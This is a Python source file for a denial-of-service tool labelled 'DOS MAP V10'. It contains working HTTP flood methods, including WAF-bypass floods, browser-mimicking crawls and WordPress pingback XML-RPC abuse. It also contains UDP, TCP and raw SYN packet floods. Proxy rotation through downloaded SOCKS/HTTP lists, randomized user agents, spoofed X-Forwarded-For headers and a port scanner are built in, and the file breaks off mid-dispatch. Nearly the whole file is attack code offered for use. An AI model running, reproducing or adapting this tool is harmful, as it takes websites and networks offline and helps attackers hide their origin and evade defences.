from socket import socket, AF_INET, SOCK_STREAM, SOCK_DGRAM, SOCK_RAW, IP_HDRINCL, IPPROTO_TCP, IPPROTO_IP, TCP_NODELAY
from threading import Thread
from random import choice as che
from random import randint as ran
from random import _urandom as byt
from time import sleep as slp
from os import system as stm
from json import load
from time import time as timee
from requests import get 
from requests import Session as ses
from fake_useragent import UserAgent
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin as ujoin
from urllib.parse import urlparse as parss
from impacket.ImpactPacket import IP, TCP
from colorama import init, Fore
from os import name, kill, getpid
from sys import argv
from http.client import HTTPResponse as httpr
from socks import socksocket, HTTP, SOCKS4, SOCKS5
from certifi import where
from ssl import CERT_NONE, SSLContext, create_default_context
init()
ctx = create_default_context(cafile=where())
ctx.check_hostname = False
ctx.verify_mode = CERT_NONE



red = Fore.LIGHTRED_EX; gre = Fore.LIGHTGREEN_EX; blu = Fore.LIGHTBLUE_EX; yel = Fore.LIGHTYELLOW_EX; cye = Fore.LIGHTCYAN_EX
if name == 'nt': cl = "cls"
else: cl = "clear"


open('http.txt', 'a')
open('socks4.txt', 'a')
open('socks5.txt', 'a')

ua = UserAgent()

app = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', '*/*', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html, application/xhtml+xml, image/jxr, */*', 'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1', 'text/html, image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9']
reff = ['https://www.google.com/search?q=','https://google.com/', 'https://www.google.com/', 'https://www.bing.com/search?q=', 'https://www.bing.com/', 'https://www.youtube.com/', 'https://www.facebook.com/']


def ban():
		stm(cl);print(f'''{red}\n     _   _   _     _   _   _     _   _   _  
    / \ / \ / \   / \ / \ / \   / \ / \ / \ 
   ( {gre}D{red} | {gre}O{red} | {gre}S{red} ) ( {cye}M {red}| {cye}A {red}|{cye} P{red} ) ( {yel}V {red}|{yel} 1 {red}|{yel} 0{red} )
    \_/ \_/ \_/   \_/ \_/ \_/   \_/ \_/ \_/ \n\n{red}   ╔══════════════════╗\n   ║  {gre}1 {blu}:{yel} attack      {red}║\n   ║  {gre}2 {blu}:{yel} tool        {red}║\n   ║  {gre}3 {blu}:{yel} proxy       {red}║\n   ╚══════════════════╝\n   {red}[{yel}+{red}]════════════════════════════{red}[{yel}+{red}]\n   [{yel}+{red}]{gre} Layer{yel}7 {blu}:\n  {red} [{yel}+{red}]{gre} dmap.py <method> <url> <time> <thread> <rpc> <proxy>\n   {red}[{yel}+{red}]{gre} <proxy> : (1) http - (2) socks4 - (3) socks5\n   {red}[{yel}+{red}]{gre} <proxy> : (4) Use all - (0) Not use\n   {red}[{yel}+{red}]════════════════════════════{red}[{yel}+{red}]\n   [{yel}+{red}]{gre} Layer{yel}4 {blu}:\n   {red}[{yel}+{red}]{gre} dmap.py <method> <ip> <port> <time> <thread>\n   {red}[{yel}+{red}]{gre} <port> : (0) random port\n   {red}[{yel}+{red}]════════════════════════════{red}[{yel}+{red}]\n{yel}   python dmap.py 1&2&3\n''')
	
def att7():
	stm(cl);print(f'''{red}\n     _   _   _     _   _   _     _   _   _  
    / \ / \ / \   / \ / \ / \   / \ / \ / \ 
   ( {gre}D{red} | {gre}O{red} | {gre}S{red} ) ( {cye}M {red}| {cye}A {red}|{cye} P{red} ) ( {yel}V {red}|{yel} 1 {red}|{yel} 0{red} )
    \_/ \_/ \_/   \_/ \_/ \_/   \_/ \_/ \_/ \n\n{red}   ╔══════════════════════╗\n   ║  {yel}  Methods Layer{gre}7{red}    ║\n   ╚══════════════════════╝\n   ╔══════════════════════╗\n   ║ {gre}RAW {blu} - {gre}WAF {blu} - {gre}BYPASS{red} ║\n   ║ {gre}MIX {blu} - {gre}WP {blu} - {gre}BROWSER{red} ║\n   ║ {gre}POST {blu}- {gre} SPO {blu} - {gre}GET {red}  ║\n   ╚══════════════════════╝''')
 
 
def att4():
	print(f'''     \n{red}   ╔══════════════════════╗\n   ║  {yel}  Methods Layer{gre}4{red}    ║\n   ╚══════════════════════╝\n   ╔══════════════════════╗\n   ║ {gre} UDP {blu} - {gre}TCP {blu} - {gre}NUDP{red}  ║\n   ║ {gre} RUDP {blu} - {gre}RTCP {blu} - {gre}SYN{red} ║\n   ╚══════════════════════╝\n''')

def tol():
	stm(cl);print(f'''{red}\n     _   _   _     _   _   _     _   _   _  
    / \ / \ / \   / \ / \ / \   / \ / \ / \ 
   ( {gre}D{red} | {gre}O{red} | {gre}S{red} ) ( {cye}M {red}| {cye}A {red}|{cye} P{red} ) ( {yel}V {red}|{yel} 1 {red}|{yel} 0{red} )
    \_/ \_/ \_/   \_/ \_/ \_/   \_/ \_/ \_/ \n\n{red}   ╔══════════════════════╗\n   ║  {yel}       Tool         {red}║\n   ╚══════════════════════╝\n   {red}[{yel}+{red}]════════════════════════════{red}[{yel}+{red}]\n   {red}[{yel}+{red}] {gre}Port scan {blu}:\n   {red}[{yel}+{red}] {gre}dmap.py tool <ip> <1port:2port> <timeout>\n   {red}[{yel}+{red}]════════════════════════════{red}[{yel}+{red}]\n   {red}[{yel}+{red}] {gre}Tcp check {blu}: \n   {red}[{yel}+{red}] {gre}dmap.py tool <ip> <port> <timeout>\n   {red}[{yel}+{red}]════════════════════════════{red}[{yel}+{red}]\n''')    
    
def proo():
	stm(cl);print(f'''{red}\n     _   _   _     _   _   _     _   _   _  
    / \ / \ / \   / \ / \ / \   / \ / \ / \ 
   ( {gre}D{red} | {gre}O{red} | {gre}S{red} ) ( {cye}M {red}| {cye}A {red}|{cye} P{red} ) ( {yel}V {red}|{yel} 1 {red}|{yel} 0{red} )
    \_/ \_/ \_/   \_/ \_/ \_/   \_/ \_/ \_/ \n\n{red}   ╔══════════════════════╗\n   ║  {yel}      Proxy         {red}║\n   ╚══════════════════════╝\n   {red}[{yel}+{red}]════════════════════════════{red}[{yel}+{red}]\n   {red}[{yel}+{red}] {gre}Scan list {blu}:\n   {red}[{yel}+{red}] {gre}dmap.py proxy <proxy-type> <time out> \n   {red}[{yel}+{red}]════════════════════════════{red}[{yel}+{red}]\n   {red}[{yel}+{red}] {gre}Get proxy {blu}: \n   {red}[{yel}+{red}] {gre}dmap.py proxy <proxy-type>\n   {red}[{yel}+{red}]════════════════════════════{red}[{yel}+{red}]\n   {red}[{yel}+{red}] {gre}Files : http.txt, socks4.txt, socks5.txt\n   {red}[{yel}+{red}] {gre}Proxy apis : api.json\n   {red}[{yel}+{red}]════════════════════════════{red}[{yel}+{red}]\n''')
	

			

def strm(siz):
	return '%0x' % ran(0, 16 ** siz)
	
def spo_ip():
	addr = [192, 168, 0, 1]; d = '.'; addr[0] = str(ran(11, 197)); addr[1] = str(ran(0, 255)); addr[2] = str(ran(0, 255)); addr[3] = str(ran(2, 254)); ass = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]; return ass
	

	
		
class attack7:
	def __init__(self, url, tim, rp, pr, o):
		self.url = url
		self.tim = tim
		self.rpc = rp
		self.pr = pr
		self.h_v = [1, 2, 3]
		self.prl = [0,1,1,2,2,3,3]
		self.s4 = open('socks4.txt', 'r').read().split()
		self.s5 = open('socks5.txt', 'r').read().split()
		self.ht = open('http.txt', 'r').read().split()
		self.hosto = o.hostname
		if url.split('://')[0] == 'https':
			self.sslu = True
		else:
			self.sslu = False
		if o.port != None:
			self.portt = o.port		
		else:
			if url.split('://')[0] == 'https':
				self.portt = 443
			else:
				self.portt = 80
			self.hosto = o.hostname
			if o.path == '':
				self.patt = '/'
			else:
				self.patt = o.path 
			
	def timerr(self):
		slp(self.tim); kill(getpid(), 9)

	def con(self):
		try:
			if self.pr == 1:
				s = socksocket(); pi = che(self.ht).split(':'); s.set_proxy(HTTP, str(pi[0]), int(pi[1]))
				s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
			elif self.pr == 2:
				s = socksocket(); pi = che(self.s4).split(':'); s.set_proxy(SOCKS4, str(pi[0]), int(pi[1]))
				s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
			elif self.pr == 3:
				s = socksocket(); pi = che(self.s5).split(':'); s.set_proxy(SOCKS5, str(pi[0]), int(pi[1]))
				s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
			
			elif self.pr == 4:
				s = socksocket(); prl = che(self.prl)
				if prl == 1:
					pi = che(self.ht).split(':'); s.set_proxy(HTTP, str(pi[0]), int(pi[1]))
					s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
				elif prl == 2:
					pi = che(self.s4).split(':'); s.set_proxy(SOCKS4, str(pi[0]), int(pi[1]))
					s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
				elif prl == 3:
					pi = che(self.s5).split(':'); s.set_proxy(SOCKS5, str(pi[0]), int(pi[1]))
					s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
				elif prl == 0:
					s = socket(AF_INET, SOCK_STREAM)
			else:
				s = socket(AF_INET, SOCK_STREAM)
			if self.sslu:
				s = ctx.wrap_socket(s, server_hostname=self.hosto)#
			s.connect((self.hosto, self.portt))
			return s
		except:
			s.close()


	def raww(self):
		while True:
			try:
				s = n.con()
				payl = f'GET {self.patt} HTTP/1.1\r\nHost: {self.hosto}\r\nUser-Agent: DMAP/1.0\r\nAccept: */*\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\n\r\n'.encode()
				for _ in range(self.rpc):
					s.send(payl)
			except:
				pass				
				
	def waff(self):
		while True:
			try:
				s = n.con()
				payl = f'GET {self.patt} HTTP/1.1\r\nHost: {self.hosto}\r\nUser-Agent: {ua.random}\r\nAccept: {che(app)}\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nSec-Fetch-Dest: document\r\nDNT: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'.encode()
				s.send(payl)
				
				res = httpr(s); res.begin()
				cook = res.getheader("Set-Cookie", None)
				coni = res.getheader("Connection", None)
				if coni == 'Close' or coni == 'close' or coni == 'Upgrade, close':
					break
				if cook == None:
					payl1 = f'GET {self.url} HTTP/1.1\r\nHost: {self.hosto}\r\nUser-Agent: {ua.random}\r\nAccept: {che(app)}\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nSec-Fetch-Dest: document\r\nDNT: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'.encode()
				else:
					payl1 = f'GET {self.url} HTTP/1.1\r\nHost: {self.hosto}\r\nUser-Agent: {ua.random}\r\nAccept: {che(app)}\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nSec-Fetch-Dest: document\r\nDNT: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\nCookie: {cook}\r\n\r\n'.encode()	
				for _ in range(self.rpc):
					if _ >= self.rpc - 1:
						payl1 = payl1.replace(b"Connection: keep-alive", b"Connection: close")
					s.send(payl1)
			except:
				pass
		
	def bypasss(self):
		while True:
			try:
				s = ses()
				if self.pr == 1:
					if self.sslu:
						s.proxies["https"] = f"https://{che(self.ht)}"
					else:
						s.proxies["http"] = f"http://{che(self.ht)}"
						
				elif self.pr == 2:
					if self.sslu:
						s.proxies["https"] = f"socks4://{che(self.s4)}"
					else:
						s.proxies["http"] = f"socks4://{che(self.s4)}"					
				elif self.pr == 3:
					if self.sslu:
						s.proxies["https"] = f"socks5://{che(self.s5)}"
					else:
						s.proxies["http"] = f"socks5://{che(self.s5)}"					
				elif self.pr == 4:
					if self.sslu:
						puu = [f"socks4://{che(self.s4)}", f"socks5://{che(self.s5)}", f"https://{che(self.s4)}"]
						s.proxies["https"] = che(puu)
					else:
						puu = [f"socks4://{che(self.s4)}", f"socks5://{che(self.s5)}", f"http://{che(self.s4)}"]
						s.proxies["http"] = che(puu)				
				
				s.headers["User-Agent"] = ua.random
				s.headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,"
				s.headers["DNT"] = "1"	
				s.headers["Sec-Fetch-Dest"] = "document"
				s.headers["Sec-Fetch-Mode"] = "navigate"
				s.headers["Sec-Fetch-Site"] = "cross-site"
				s.headers["Sec-Fetch-User"] = "?1"
				s.headers["Sec-Gpc"] = "1"
				s.headers["Pragma"] = "no-cache"
				s.headers["Upgrade-Insecure-Requests"] = "1"

				for _ in range(self.rpc):
					if self.patt == '/':
						psp = f'?{strm(5)}={strm(5)}'
					else:
						if '?' in self.pat:
							psp = f'&{strm(5)}={strm(5)}'
						else:
							psp = f'?{strm(5)}={strm(5)}'
					s.get(self.url+psp)
				
			except:
				pass
		
	def mixx(self):
		while True:
			try:
				s = n.con()
				payl = f'{che(["GET", "HEAD"])} {self.patt} HTTP/1.1\r\nHost: {self.hosto}\r\nUser-Agent: DMAP/1.0\r\nAccept: */*\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\n\r\n'.encode()
				for _ in range(self.rpc):
					s.send(payl)
			except:
				pass			
	
	def wpp(self):
		while True:
			try:
				s = ses()
				if self.pr == 1:
					if self.sslu:
						s.proxies["https"] = f"https://{che(self.ht)}"
					else:
						s.proxies["http"] = f"http://{che(self.ht)}"
						
				elif self.pr == 2:
					if self.sslu:
						s.proxies["https"] = f"socks4://{che(self.s4)}"
					else:
						s.proxies["http"] = f"socks4://{che(self.s4)}"					
				elif self.pr == 3:
					if self.sslu:
						s.proxies["https"] = f"socks5://{che(self.s5)}"
					else:
						s.proxies["http"] = f"socks5://{che(self.s5)}"					
				elif self.pr == 4:
					if self.sslu:
						puu = [f"socks4://{che(self.s4)}", f"socks5://{che(self.s5)}", f"https://{che(self.s4)}"]
						s.proxies["https"] = che(puu)
					else:
						puu = [f"socks4://{che(self.s4)}", f"socks5://{che(self.s5)}", f"http://{che(self.s4)}"]
						s.proxies["http"] = che(puu)
				s.headers["User-Agent"] = ua.random
				payl = f'''<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>{strm(32)}</string></value>
</param>
<param>
<value><string>{strm(32)}</string></value>
</param>
</params>
</methodCall>'''

				for _ in range(self.rpc):
					s.post(self.url, data=payl)
			except:
				pass
	
	def browserr(self):
		while True:
			try:
				s = ses()
				if self.pr == 1:
					if self.sslu:
						s.proxies["https"] = f"https://{che(self.ht)}"
					else:
						s.proxies["http"] = f"http://{che(self.ht)}"
						
				elif self.pr == 2:
					if self.sslu:
						s.proxies["https"] = f"socks4://{che(self.s4)}"
					else:
						s.proxies["http"] = f"socks4://{che(self.s4)}"					
				elif self.pr == 3:
					if self.sslu:
						s.proxies["https"] = f"socks5://{che(self.s5)}"
					else:
						s.proxies["http"] = f"socks5://{che(self.s5)}"					
				elif self.pr == 4:
					if self.sslu:
						puu = [f"socks4://{che(self.s4)}", f"socks5://{che(self.s5)}", f"https://{che(self.s4)}"]
						s.proxies["https"] = che(puu)
					else:
						puu = [f"socks4://{che(self.s4)}", f"socks5://{che(self.s5)}", f"http://{che(self.s4)}"]
						s.proxies["http"] = che(puu)				
				
				s.headers["User-Agent"] = ua.random
				s.headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,"
				s.headers["DNT"] = "1"	
				s.headers["Sec-Fetch-Dest"] = "document"
				s.headers["Sec-Fetch-Mode"] = "navigate"
				s.headers["Sec-Fetch-Site"] = "cross-site"
				s.headers["Sec-Fetch-User"] = "?1"
				s.headers["Sec-Gpc"] = "1"
				s.headers["Pragma"] = "no-cache"
				s.headers["Upgrade-Insecure-Requests"] = "1"
				so = bs(s.get(self.url).content, "html.parser")
				urls = []
				for script in so.find_all("script"):
					if script.attrs.get("src"):
						script_ = ujoin(self.url, script.attrs.get("src"))
						urls.append(script_)
				for ime in so.find_all("img"):
					if ime.attrs.get("src"):
						img_ = ujoin(self.url, ime.attrs.get("src"))
						urls.append(img_)
				for csx in so.find_all("link"):
					if csx.attrs.get("href"):
						csx_ = ujoin(self.url, csx.attrs.get("href"))
						urls.append(csx_)		

				def u_opener(s, j_url):
					try:
						s.get(j_url)
					except:
						pass
						inf = {}

				for urr in urls:
					Thread(target=u_opener, args=[s, urr]).start()

				for fo in so.find_all("form"):
					fo_url = ujoin(self.url, fo.get("action"))
					met = fo.get('method')
					inp = so.find_all('input')
					inf = {}
					if met == 'post' or met == 'POST':
						for te in inp:
							if te == None:
								pass
							else:
								inf[str(te.get('name'))] = strm(ran(6, 24))
						s.post(fo_url, data=inf)
					elif met == 'get' or met == 'GET':
						for te in inp:
							if te == None:
								pass
							else:
								inf[str(te.get('name'))] = strm(ran(6, 24))
						s.get(fo_url, params=inf)
				slp(self.rpc)
				for _ in range(self.rpc):
					if self.patt == '/':
						psp = f'?{strm(5)}={strm(5)}'
					else:
						if '?' in self.pat:
							psp = f'&{strm(5)}={strm(5)}'
						else:
							psp = f'?{strm(5)}={strm(5)}'
					s.get(self.url+psp)
#BHH1script
			except:
				pass
	def postt(self):
		while True:
			try:
				s = ses()
				if self.pr == 1:
					if self.sslu:
						s.proxies["https"] = f"https://{che(self.ht)}"
					else:
						s.proxies["http"] = f"http://{che(self.ht)}"
						
				elif self.pr == 2:
					if self.sslu:
						s.proxies["https"] = f"socks4://{che(self.s4)}"
					else:
						s.proxies["http"] = f"socks4://{che(self.s4)}"					
				elif self.pr == 3:
					if self.sslu:
						s.proxies["https"] = f"socks5://{che(self.s5)}"
					else:
						s.proxies["http"] = f"socks5://{che(self.s5)}"					
				elif self.pr == 4:
					if self.sslu:
						puu = [f"socks4://{che(self.s4)}", f"socks5://{che(self.s5)}", f"https://{che(self.s4)}"]
						s.proxies["https"] = che(puu)
					else:
						puu = [f"socks4://{che(self.s4)}", f"socks5://{che(self.s5)}", f"http://{che(self.s4)}"]
						s.proxies["http"] = che(puu)
				s.headers["User-Agent"] = ua.random
				payl = strm(ran(16, 124))
				
				for _ in range(self.rpc):
					s.post(self.url, data=payl)
			except:
				pass							
	def spoo(self):
		while True:
			try:
				ipt = spo_ip()
				s = n.con()
				payl = f'GET {self.patt}?{strm(6)}={strm(6)}={strm(6)} HTTP/1.{che(self.h_v)}\r\nHost: {self.hosto}\r\nUser-Agent: {ua.random}\r\nAccept: {che(app)}\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nSec-Fetch-Dest: document\r\nDNT: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\nX-Originating-IP: {ipt}\r\nX-Forwarded-For: {ipt}\r\nX-Forwarded: {ipt}\r\nForwarded-For: {ipt}\r\nX-Forwarded-Host: {ipt}\r\nX-Remote-IP: {ipt}\r\nX-Remote-Addr: {ipt}\r\nX-ProxyUser-Ip: {ipt}\r\nX-Original-URL: {ipt}\r\nClient-IP: {ipt}\r\nX-Client-IP: {ipt}\r\nTrue-Client-IP: {ipt}\r\nX-Host: {ipt}\r\nCluster-Client-IP: {ipt}\r\nX-ProxyUser-Ip: {ipt}\r\nVia: 1.0 fred, 1.1 {ipt}\r\n\r\n'.encode()

				for _ in range(self.rpc):
					s.send(payl)
			except:
				pass
	def gett(self):
		while True:
			try:
				s = n.con()
				payl = f'GET {self.patt} HTTP/1.1\r\nHost: {self.hosto}\r\nUser-Agent: {ua.random}\r\nAccept: {che(app)}\r\nReferer: {che(reff)}\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nSec-Fetch-Dest: document\r\nDNT: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'.encode()
				for _ in range(self.rpc):
					s.send(payl)
			except:
				pass				
				
				
class attack4:
	def __init__(self, ip, port, tim):
		ss = socket(AF_INET, SOCK_DGRAM); ss.connect(("8.8.8.8", 80))
		self.ip = ip
		self.dip = ss.getsockname()[0]
		self.port = port
		self.tim = tim
	def synmak(self):
		ipp = IP()
		ipp.set_ip_src(self.dip)
		ipp.set_ip_dst(self.ip)
		tcpp = TCP()
		tcpp.set_SYN()
		tcpp.set_th_flags(0x02)
		tcpp.set_th_dport(self.port)
		tcpp.set_th_sport(ran(10000, 65535))
		ipp.contains(tcpp)
		return ipp.get_packet()		
		
	def udpp(self):
		while True:
			try:
				s = socket(AF_INET, SOCK_DGRAM)
				pack = byt(1024)
				if self.port == 0:
					porto = ran(10, 65535)
				else:
					porto = self.port
				for _ in range(1000):
					
					s.sendto(pack, (self.ip, porto))
			except:
				pass
			
	def tcpp(self):
		while True:
			try:
				s = socket(AF_INET, SOCK_STREAM)
				s.connect((self.ip, self.port))
				pack = byt(1024)
				for _ in range(1000):
					s.send(pack)
			except:
				pass		
				
	def synn(self):
		while True:
			try:
				s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
				s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
				for _ in range(1000):
					s.sendto(synmak(), ((self.ip, self.port)))
			except:
				pass
	
	def rudpp(self):
		while True:
			try:
				s = socket(AF_INET, SOCK_DGRAM)
				pack = byt(ran(512, 3072))
				if self.port == 0:
					porto = ran(10, 65535)
				else:
					porto = self.port
				for _ in range(1000):
					s.sendto(pack, (self.ip, porto))
			except:
				pass
			
	def rtcpp(self):
		while True:
			try:
				s = socket(AF_INET, SOCK_STREAM)
				s.connect((self.ip, self.port))
				pack = byt(ran(512, 3072))
				for _ in range(1000):
					s.send(pack)
			except:
				pass			
	def nudpp(self):
		while True:
			try:
				s = socket(AF_INET, SOCK_DGRAM)
				pack = ('\x00' * ran(1, 128)).encode()
				if self.port == 0:
					porto = ran(10, 65535)
				else:
					porto = self.port				
				for _ in range(1000):
					s.sendto(pack, (self.ip, porto))
			except:
				pass	
	def timerr(self):
		slp(self.tim); kill(getpid(), 9)
		
				
class proxx:
	def __init__(self, typ, timo):
		self.pt = typ
		self.s4 = open('socks4.txt', 'r').read().split()
		self.s5 = open('socks5.txt', 'r').read().split()
		self.ht = open('http.txt', 'r').read().split()
		self.out = timo
		self.api = load(open('api.json', 'r'))
	def checkk(self):
		print('\n')
		def con(pii, ty):
			try:
				s = socksocket();pi = pii.split(':')
				if ty == 1:
					s.set_proxy(HTTP, str(pi[0]), int(pi[1]))
					file_ = 'http.txt'
				elif ty == 2:
					s.set_proxy(SOCKS4, str(pi[0]), int(pi[1]))
					file_ = 'socks4.txt'
				elif ty == 3:
					s.set_proxy(SOCKS5, str(pi[0]), int(pi[1]))
					file_ = 'socks5.txt'
				s.settimeout(self.out)
				s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
				s.connect(('1.1.1.1', 80))
				s.send(b'GET / HTTP/1.1\r\nHost:1.1.1.1:80\r\nAccept: */*\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\n\r\n')		
				open(file_, 'a+').write(pii+'\n')
			except:
				pass
		
		if self.pt == 1 or self.pt == 4:
			print(f'  {red}[{yel}+{red}]{gre} Check http & len : {len(self.ht)}')
			open('http.txt', 'w').close()
			for pro in self.ht:
				Thread(target=con, args=[pro, 1]).start()
				slp(0.01)
			slp(self.out * 2)
			print(f'  {red}[{yel}+{red}]{gre} http good : {len(open("http.txt", "r").read().split())}\n')
			
		if self.pt == 2 or self.pt == 4:
			print(f'  {red}[{yel}+{red}]{gre} Check socks4 & len : {len(self.s4)}')
			open('socks4.txt', 'w').close()
			for pro in self.s4:
				Thread(target=con, args=[pro, 2]).start()
				slp(0.01)
			slp(self.out * 2)
			print(f'  {red}[{yel}+{red}]{gre} socks4 good : {len(open("socks4.txt", "r").read().split())}\n')
			
			
		if self.pt == 3 or self.pt == 4:
			print(f'  {red}[{yel}+{red}]{gre} Check socks5 & len : {len(self.s5)}')
			open('socks5.txt', 'w').close()
			for pro in self.s5:
				Thread(target=con, args=[pro, 3]).start()
				slp(0.01)
			slp(self.out * 2)
			print(f'  {red}[{yel}+{red}]{gre} socks5 good : {len(open("socks5.txt", "r").read().split())}\n')				
			
	def downn(self):
		def htt():
			print(f'  {red}[{yel}+{red}]{gre} Download http proxy')
			pf = open('http.txt', 'w+')
			for i in self.api['http']:
				re = (get(i).text).split()
				for pyy in re:
					pf.write(pyy+'\n')
			pf.close()
			print(f'  {red}[{yel}+{red}]{gre} Done & len : {len(open("http.txt", "r").read().split())}')
		def soc4():
			print(f'  {red}[{yel}+{red}]{gre} Download socks4 proxy')
			pf = open('socks4.txt', 'w+')
			for i in self.api['socks4']:
				re = (get(i).text).split()
				for pyy in re:
					pf.write(pyy+'\n')
			pf.close()
			print(f'  {red}[{yel}+{red}]{gre} Done & len : {len(open("socks4.txt", "r").read().split())}')		
		def soc5():
			print(f'  {red}[{yel}+{red}]{gre} Download socks5 proxy')
			pf = open('socks5.txt', 'w+')
			for i in self.api['socks5']:
				re = (get(i).text).split()
				for pyy in re:
					pf.write(pyy+'\n')					
			pf.close()
			print(f'  {red}[{yel}+{red}]{gre} Done & len : {len(open("socks5.txt", "r").read().split())}')					
		if self.pt == 1 or self.pt == 4:
			htt()		
		if self.pt == 2 or self.pt == 4:
			soc4()
		if self.pt == 3 or self.pt == 4:
			soc5()
class dtool():
	def __init__(self, ip, port, out):
		self.ip = ip
		self.port = port
		self.out = out
	def pscan(self):
		print('\n')
		def conn(portt):
			try:
				s = socket(AF_INET, SOCK_STREAM)
				s.settimeout(self.out)
				s.connect((self.ip, int(portt)))
				print(f'  {red}[{yel}+{red}] {gre}PORT {blu}:{gre} {self.ip}:{portt} {red}& {yel}OPEN')
			except:
				pass
		ports = self.port.split(':')
		for i_ in range(int(ports[0]), int(ports[1])):
			Thread(target=conn, args=[i_]).start()
		slp(self.out + 5)
		print(f'\n  {red}[{yel}+{red}] {gre}End')
	def tping(self):
		print('\n')
		def conn():
			try:
				s = socket(AF_INET, SOCK_STREAM)
				s.settimeout(self.out)
				uy = timee()
				s.connect((self.ip, int(self.port)))
				tyy = str(timee() - uy)[0:5]
				print(f'  {red}[{yel}PING{red}] {gre}Connected {red}>>{gre} time {blu}:{yel} {tyy}')
			except:
				print(f'  {red}[{yel}PING{red}] Connection timed out.')
		
		while True:
			conn()
			slp(1)
		
			
		
		
		
m4 = ['udp','tcp','syn','rudp','nudp','rtcp']
m7 = ['raw','waf','bypass','mix','post','browser','get', 'spo', 'wp']
if __name__ == '__main__':

	if len(argv) == 1:
		ban()
	elif argv[1] == '1':
		att7()
		att4()
	elif argv[1] == '2':
		tol()
	elif argv[1] == '3':
		proo()
		
	elif argv[1] in m7:
		
		if len(argv) == 7:
			print(f'\n  {red}[{yel}+{red}]{gre} Attack started')
			n = attack7(argv[2], int(argv[3]), int(argv[5]), int(argv[6]), parss(argv[2]))
			Thread(target=n.timerr).start()
			if argv[1] == 'raw':
				for _ in range(int(argv[4])):
					Thread(target=n.raww).start()
			elif argv[1] == 'waf':
				for _ in range(int(argv[4])):
					Thread(target=n.waff).start()				
			elif argv[1] == 'mix':
				for _ in range(int(argv[4])):
					Thread(target=n.mixx).start()				
			elif argv[1] == 'bypass':
				for _ in range(int(argv[4])):
					Thread(target=n.bypasss).start()				
			elif argv[1] == 'post':
				for _ in range(int(argv[4])):
					Thread(target=n.postt).start()				
			elif argv[1] == 'wp':
				for _ in range(int(argv[4])):
					Thread(target=n.wpp).start()				
			elif argv[1] == 'browser':
				for _ in range(int(argv[4])):
					Thread(target=n.browserr).start()				
			elif argv[1] == 'spo':
				for _ in range(int(argv[4])):
					Thread(target=n.spoo).start()				
			elif argv[1] == 'get':
				for _ in range(int(argv[4])):
					Thread(target=n.gett).start()					
		else:
			ban()
			
	elif argv[1] in m4:
		if len(argv) == 6:
			print(f'\n  {red}[{yel}+{red}]{gre} Attack started')
			n = attack4(argv[2], int(argv[3]), int(argv[4]))
			Thread(target=n.timerr).start()
			
			if argv[1] == 'udp':
				for _ in range(int(argv[5])):
					Thread(target=n.udpp).start()		
			elif argv[1] == 'tcp':
				for _ in range(int(argv[5])):
					Thread(target=n.tcpp).start()				
			elif argv[1] == 'syn':
				for _ in range(int(argv[5])):
					Thread(target=n.synn).start()				
			elif argv[1] == 'nudp':
				for _ in range(int(argv[5])):
